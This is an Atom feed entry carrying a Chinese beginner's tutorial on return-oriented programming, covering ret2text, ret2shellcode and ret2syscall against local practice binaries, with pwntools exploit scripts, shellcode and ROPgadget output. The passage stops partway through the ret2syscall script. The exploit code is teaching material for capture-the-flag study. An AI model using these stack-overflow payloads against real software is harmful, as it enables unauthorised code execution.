<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Live to change world</title>
  <icon>https://www.gravatar.com/avatar/407c7d18cd1450695f6a7b58b1e16b4c</icon>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.killshadow.xyz/"/>
  <updated>2019-06-06T07:40:18.195Z</updated>
  <id>http://www.killshadow.xyz/</id>
  
  <author>
    <name>killshadow</name>
    <email>chaceli@foxmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>1.2-菜鸟学PWN之ROP学习</title>
    <link href="http://www.killshadow.xyz/2019/06/06/1.2-%E8%8F%9C%E9%B8%9F%E5%AD%A6PWN%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/</id>
    <published>2019-06-06T07:23:00.000Z</published>
    <updated>2019-06-06T07:40:18.195Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>实现ROP的两个条件:</p><ul><li>程序存在栈溢出, 并可控制返回地址.</li><li>可以找到所需的gadgets以及它所在的地址.</li></ul></blockquote><a id="more"></a><blockquote><p>我们在上文学习了最基本的栈溢出技巧, 这种情况下我们直接跳转到<code>system('/bin/sh')</code>即可, 但真实环境下往往没有如此简(ruo)单(zhi)的存在. 而是, 需要经过多次跳转, 甚至精心构造shellcode才能完整的执行系统调用. 而我们把<strong>经过多次跳转, 最终完整执行shellcode的方法叫做<code>ROP(Return  Oriented Programming)</code></strong>. 构造shellcode的过程当中, 由于程序/系统的限制, 我们通过<strong>利用程序中存在的程序小片段(gadgets, 以ret结尾的指令序列)来改变寄存器或者变量的值, 从而控制程序流程, 实现多次跳转.</strong></p></blockquote><h2 id="x10-背景知识">0x10 背景知识</h2><h3 id="x11-寄存器介绍">0X11 寄存器介绍</h3><p>32位x86架构下的寄存器分类如下:</p><div style="text-align: center;"><figure><img src="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/Selection_032.png" alt="x86寄存器分类"><figcaption>x86寄存器分类</figcaption></figure></div><p>64位86_x64架构下的寄存器分类如下:</p><table><thead><tr class="header"><th>Register</th><th>状态</th><th>请使用</th></tr></thead><tbody><tr class="odd"><td><strong>RAX</strong></td><td><strong>易失的</strong></td><td><strong>返回值寄存器</strong></td></tr><tr class="even"><td><strong>RCX</strong></td><td><strong>易失的</strong></td><td><strong>第一个整型参数</strong></td></tr><tr class="odd"><td><strong>RDX</strong></td><td><strong>易失的</strong></td><td><strong>第二个整型参数</strong></td></tr><tr class="even"><td><strong>R8</strong></td><td><strong>易失的</strong></td><td><strong>第三个整型参数</strong></td></tr><tr class="odd"><td><strong>R9</strong></td><td><strong>易失的</strong></td><td><strong>第四个整型参数</strong></td></tr><tr class="even"><td><strong>R10:R11</strong></td><td><strong>易失的</strong></td><td><strong>必须根据需要由调用方保留；在 syscall/sysret 指令中使用</strong></td></tr><tr class="odd"><td><strong>R12:R15</strong></td><td><strong>非易失的</strong></td><td><strong>必须由被调用方保留</strong></td></tr><tr class="even"><td><strong>RDI</strong></td><td><strong>非易失的</strong></td><td><strong>必须由被调用方保留</strong></td></tr><tr class="odd"><td><strong>RSI</strong></td><td><strong>非易失的</strong></td><td><strong>必须由被调用方保留</strong></td></tr><tr class="even"><td><strong>RBX</strong></td><td><strong>非易失的</strong></td><td><strong>必须由被调用方保留</strong></td></tr><tr class="odd"><td><strong>RBP</strong></td><td><strong>非易失的</strong></td><td><strong>可用作帧指针；必须由被调用方保留</strong></td></tr><tr class="even"><td><strong>RSP</strong></td><td><strong>非易失的</strong></td><td><strong>堆栈指针</strong></td></tr><tr class="odd"><td><strong>XMM0</strong></td><td><strong>易失的</strong></td><td><strong>第一个 FP 参数</strong></td></tr><tr class="even"><td><strong>XMM1</strong></td><td><strong>易失的</strong></td><td><strong>第二个 FP 参数</strong></td></tr><tr class="odd"><td><strong>XMM2</strong></td><td><strong>易失的</strong></td><td><strong>第三个 FP 参数</strong></td></tr><tr class="even"><td><strong>XMM3</strong></td><td><strong>易失的</strong></td><td><strong>第四个 FP 参数</strong></td></tr><tr class="odd"><td><strong>XMM4:XMM5</strong></td><td><strong>易失的</strong></td><td><strong>必须根据需要由调用方保留</strong></td></tr><tr class="even"><td><strong>XMM6:XMM15</strong></td><td><strong>非易失的</strong></td><td><strong>必须根据需要由被调用方保留。</strong></td></tr></tbody></table><p>x64 结构提供了 16 个通用寄存器（以后称为整数寄存器），以及 16 个可供浮点使用的 XMM 寄存器。易失寄存器是由调用方假想的临时寄存器，并要在调用过程中销毁。非易失寄存器需要在整个函数调用过程中保留其值，并且一旦使用，则必须由被调用方保存。</p><h3 id="x12-进程内存布局">0x12 进程内存布局</h3><ul><li>32位模式下进程内存经典布局:<div style="text-align: center;"><figure><img src="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/1533549062535.png" alt="32位模式下进程内存"><figcaption>32位模式下进程内存</figcaption></figure></div></li><li>64位模式下进程内存经典布局(简略版):<div style="text-align: center;"><figure><img src="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/1533553264967.png" alt="64位模式下进程内存布局(简略)"><figcaption>64位模式下进程内存布局(简略)</figcaption></figure></div></li></ul><hr><h2 id="x20-基础rop">0x20 基础ROP</h2><h3 id="x21-ret2text">0x21 ret2text</h3><p>ret2text即控制栈里的返回值, 使其返回到程序本身的某个代码段(.text). 上文<a href="https://www.killshadow.xyz/2018/10/10/1.1-%E8%8F%9C%E9%B8%9F%E5%AD%A6PWN%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/">1.1-菜鸟学PWN之栈溢出学习</a>中的例子已经提到过, 其核心思想就是: <strong>利用栈溢出, 覆盖返回地址到系统调用函数</strong>, 例如<code>system(/bin/sh)</code>.</p><blockquote><p>payload = 'a' * value_offset_for_ebp + p32(system_func_addr)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">                            High address</span><br><span class="line">                         +---------------+</span><br><span class="line">                         |               |</span><br><span class="line">                         |     ......    |</span><br><span class="line">                         |               |</span><br><span class="line"> variable in stack +---&gt; +---------------+</span><br><span class="line"> offset from ebp         | return address| +--------------+</span><br><span class="line">                         +---------------+  &lt;---+ stack   |</span><br><span class="line">                         |     ebp       |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |     ......    |                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+ &lt;--------------+</span><br><span class="line">                         |               |</span><br><span class="line">   system function +---&gt; +---------------+</span><br><span class="line">(eg:system(&apos;/bin/sh&apos;))   |               |</span><br><span class="line">                         +---------------+  &lt;---+ function(.text)</span><br><span class="line">                         |               |</span><br><span class="line">                         +---------------+</span><br><span class="line">                         |               |</span><br><span class="line">                         |     ......    |</span><br><span class="line">                         |               |</span><br><span class="line">                         +---------------+</span><br><span class="line">                           Low address</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># execute elf</span></span><br><span class="line">sh = process(<span class="string">"ret2text"</span>)</span><br><span class="line"><span class="comment"># this is system('/bin/sh') address</span></span><br><span class="line">exec_addr = <span class="number">0x0804863a</span></span><br><span class="line"><span class="comment"># this is ebp address</span></span><br><span class="line">gets_ebp_addr = <span class="number">0xffffce78</span></span><br><span class="line"><span class="comment"># this is 's' value address</span></span><br><span class="line">s_addr = <span class="number">0xffffcdf0</span> + <span class="number">0x1c</span></span><br><span class="line"><span class="comment"># this is offset between ebp address and 's' value address</span></span><br><span class="line">rop_offset = gets_ebp_addr - s_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*(rop_offset + <span class="number">4</span>) + p32(exec_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="x22-ret2shellcode">0x22 ret2shellcode</h3><p>ret2shellcode即控制栈里的返回值, 使其返回到自己填充的shellcode代码. shellcode指的是用于完成某个功能的(汇编)代码. 这里需要注意的是, <strong>填充shellcode的时候, 一定要将shellcode填充到可执行段中.</strong> 其核心思想是: <strong>利用栈溢出, 使返回地址返回到自己填充的shellcode里.</strong></p><ol type="1"><li><p>查看保护, 发现有一个可读可写可执行的段:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  demo checksec ret2shellcode</span><br><span class="line">[*] &apos;/home/ks/ctf/pwn/stack/demo/ret2shellcode&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></li><li><p>IDA反汇编之后可看到主函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面可以看出, <code>gets()</code>函数存在栈溢出. <code>strncpy</code>函数可以看到将s变量的字符串复制到buf2中, 那我们再看看buf2所处的位置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br></pre></td></tr></table></figure><p>可看到, buf2是有100个元素的字符型数组, 存在于bss段中. 我们动态调试一下bss段的权限:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x /home/ks/ctf/pwn/stack/demo/ret2shellcode</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-x /home/ks/ctf/pwn/stack/demo/ret2shellcode</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rwx /home/ks/ctf/pwn/stack/demo/ret2shellcode</span><br><span class="line">0xf7dcb000 0xf7fa0000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa0000 0xf7fa1000 0x001d5000 --- /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa1000 0xf7fa3000 0x001d5000 r-x /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa3000 0xf7fa4000 0x001d7000 rwx /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa4000 0xf7fa7000 0x00000000 rwx </span><br><span class="line">0xf7fcf000 0xf7fd1000 0x00000000 rwx </span><br><span class="line">0xf7fd1000 0xf7fd4000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7fd4000 0xf7fd6000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 0x00025000 r-x /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 0x00026000 rwx /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure><p>根据上面从ida看到的, buf2在<code>0x0804a080</code>中, 即为上示gdb的vmmap的<code>0x0804a00</code>~<code>0x0804b00</code>中, 可以看出该段的权限, 可读可写可执行, 因此, 我们的思路便是: <strong>将shellcode填充的s中, 然后将s中的shellcode复制到buf2中.</strong></p><blockquote><p>payload = (include assembly system function)shellcode + (ret)buf2_addr</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">                           High address</span><br><span class="line">                        +---------------+</span><br><span class="line">                        |               |</span><br><span class="line">                        |     ......    |</span><br><span class="line">                        |               |</span><br><span class="line">variable in stack +---&gt; +---------------+</span><br><span class="line">offset from ebp         | return address| +--------------+</span><br><span class="line">                        +---------------+  &lt;---+ stack   |</span><br><span class="line">                        |     ebp       |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |     ......    |                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+ &lt;--------------+</span><br><span class="line">                        |               |</span><br><span class="line">      shellcode   +---&gt; +---------------+</span><br><span class="line">                        |               |</span><br><span class="line">                        +---------------+  &lt;---+ RWX segment</span><br><span class="line">                        |               |</span><br><span class="line">                        +---------------+</span><br><span class="line">                        |               |</span><br><span class="line">                        |     ......    |</span><br><span class="line">                        |               |</span><br><span class="line">                        +---------------+</span><br><span class="line">                          Low address</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"ret2shellcode"</span>)</span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="comment"># shell = 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">s_addr = <span class="number">0xffffcde0</span> + <span class="number">0x1c</span></span><br><span class="line">ebp_addr = <span class="number">0xffffce68</span></span><br><span class="line">ret_offset = ebp_addr - s_addr + <span class="number">4</span></span><br><span class="line"><span class="keyword">print</span> ret_offset</span><br><span class="line"><span class="comment"># ljust means fill with "A"</span></span><br><span class="line">payload = shell.ljust(ret_offset,<span class="string">"A"</span>) + p32(buf2_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="x23-ret2syscall">0x23 ret2syscall</h3><p>顾名思义, ret2syscall就是<strong>利用gadgets控制程序执行系统调用, 获取shellcode</strong>.</p><ol type="1"><li><p>首先查看程序开启的保护:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  demo checksec ret2syscall</span><br><span class="line">[*] &apos;/home/ks/ctf/pwn/stack/demo/ret2syscall&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>NX保护依旧打开, canary关闭则可直接栈溢出.</p></li><li><p>在反汇编程序, 得到主函数如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Something surprise here, but I don't think it will work."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What do you think ?"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面可以看到, 还是一个栈溢出的漏洞.</p></li><li><p>我们无法直接利用程序中的某一段代码或者自己填写的代码来获得shell, 因此只能利用程序中的一段代码或者自己填写的代码来获得shell. 通过<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" target="_blank" rel="noopener">系统调用</a>来获取shell. 应用程序调用系统调用的过程是:</p><blockquote><ol type="1"><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）;</li></ol></blockquote><p>关于Linux系统调用号, 请到<a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">这里</a>查看. 我们能查到<code>execve</code>的系统调用号为<code>0x0b</code>, 如下图:</p><div style="text-align: center;"><figure><img src="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/Selection_034.png" alt="execve系统调用号"><figcaption>execve系统调用号</figcaption></figure></div><p>可知, 有三个参数, 分别对应<code>ebx</code>, <code>ecx</code>, <code>edx</code>. 我们需要使得:</p><blockquote><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul></blockquote></li><li><p>那我们如何控制这些寄存器的值呢? 这里就需要我们使用gadgets. 比如当前栈帧的栈顶是<code>0x20</code>那么我们<code>pop eax</code>即可改变<code>eax</code>的值为<code>0x20</code>. 但是很少有一段gadgets里连续pop以上四个寄存器, 所以我们需要跳转到几个gadgets, 这就是rop技术的真正实现.</p><ol type="1"><li>我们先寻找一下<code>pop eax | ret</code>:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2syscall --only &apos;pop|ret&apos; | grep &apos;eax&apos;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>可看到有好几段, 这里我们选择<code>0x080bb196</code>来作为第一段跳板.</p><ol start="2" type="1"><li>接下来我们再看看<code>ebx</code>:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2syscall --only &apos;pop|ret&apos; | grep &apos;ebx&apos;      </span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这里有很多个<code>pop ebx</code>的gadgets, 但是在<code>0x0806eb90</code>中, 三个pop操作分别是对<code>edx ecx ebx</code>, 这个gadgets便能满足<code>execve</code>的三个参数所需的寄存器. 因此我们选择这一段.</p><ol start="3" type="1"><li>然后我们再看一下是否有<code>/bin/sh</code>字符串在程序里：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2syscall --string &quot;/bin/sh&quot;           </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>可看到在<code>0x080be408</code>含有该字符串.</p><ol start="4" type="1"><li>最后我们还需要触发0x80号中断, 因此还要找到该中断对应的地址:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &apos;int&apos;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure></li><li><p>上面步骤的四个小步骤已经帮我们找到了所需的4段gadgets, 接下来我们payload直接使用这些gadgets即可:</p><blockquote><p>payload = (gadget1_pop_syscall_eax + value) + (gadget2_pop_other_register + value) + (gadget3_int_address)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">ret_offset = <span class="number">0xffffcfb8</span> - (<span 